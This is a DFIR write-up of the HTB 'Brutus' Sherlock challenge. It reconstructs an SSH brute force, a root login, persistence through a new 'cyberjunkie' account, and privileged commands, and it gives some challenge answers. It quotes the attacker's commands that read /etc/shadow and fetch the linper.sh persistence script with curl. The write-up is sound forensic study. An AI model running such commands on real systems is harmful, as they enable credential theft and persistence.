# Investigation Notes — HTB Brutus

## 1. Challenge Overview

The **Brutus** Sherlock challenge focuses on investigating suspicious activity through Linux authentication and system logs. The scenario involves a Confluence server whose SSH service was brute-forced, followed by additional attacker activity.

<img width="1920" height="1200" alt="Screenshot (83)" src="https://github.com/user-attachments/assets/8d4773c7-5229-4016-a205-78a60476396d" />


---

## 2. Authentication Log Analysis

The `auth.log` evidence shows repeated failed SSH authentication attempts from **65.2.161.68**, followed by a successful SSH login as `root`.

The logs also show subsequent sessions and account-related activity that help reconstruct the attack timeline.

![Authentication log analysis](../screenshots/02-auth-log-analysis.png)

### Key observations

- Multiple failed authentication attempts were recorded.
- SSH connection throttling occurred after repeated connections.
- A successful password authentication for `root` was recorded from `65.2.161.68`.
- A root session was subsequently opened.
- A new local account named `cyberjunkie` was created later in the activity.

---

## 3. Persistence — MITRE ATT&CK

The attacker created a new local account, `cyberjunkie`, which is a persistence mechanism.

The corresponding MITRE ATT&CK technique is:

**T1136.001 — Create Account: Local Account**

![MITRE ATT&CK T1136.001 — Create Account](../screenshots/03-mitre-attack.png)

### Why this matters

Creating an additional account can provide an attacker with secondary access to a compromised system and reduce dependence on the original compromised credentials.

---

## 4. Command Analysis

The command evidence shows privileged commands executed through `sudo` by the `cyberjunkie` account.

![Command analysis from auth.log](../screenshots/04-command-analysis.png)

### Observed commands

The investigation identified commands including:

```text
/usr/bin/cat /etc/shadow
```

and:

```text
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

The `curl` command downloads the `linper.sh` script from GitHub and is executed using elevated privileges. This is significant because it demonstrates post-compromise command execution with root-level access.

---

## 5. Completed Investigation Tasks

The challenge answers were validated successfully. The evidence includes the MITRE ATT&CK sub-technique, the end time of the attacker's first SSH session, and the full privileged command used to download the script.

![Completed Sherlock tasks](../screenshots/05-completed-tasks.png)

### Important confirmed result

The attacker's first SSH session ended at:

```text
2024-03-06 06:37:24
```

The privileged download command was:

```text
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

---

## 6. Sherlock Completion

The final screen confirms that the **Brutus Sherlock was successfully solved**.

![Brutus Sherlock successfully completed](../screenshots/06-sherlock-completed.png)

**Solve date:** 27 Aug 2026  
**XP earned:** 195  
**Sherlock rank:** #37621

---

## 7. Investigation Summary

The investigation can be summarized as follows:

1. The attacker generated numerous failed SSH authentication attempts.
2. The attacker successfully authenticated as `root` from `65.2.161.68`.
3. A new account named `cyberjunkie` was created, providing persistence.
4. The attacker used `sudo` to perform privileged commands.
5. `/etc/shadow` was accessed.
6. A remote `linper.sh` script was downloaded using `curl` with root privileges.
7. The observed persistence activity was mapped to **MITRE ATT&CK T1136.001**.
8. The Sherlock challenge was successfully completed.

## 8. Skills Demonstrated

- Linux authentication log analysis
- SSH investigation
- Incident timeline reconstruction
- Account and persistence analysis
- Privileged command analysis
- MITRE ATT&CK mapping
- Basic DFIR methodology
- Evidence documentation
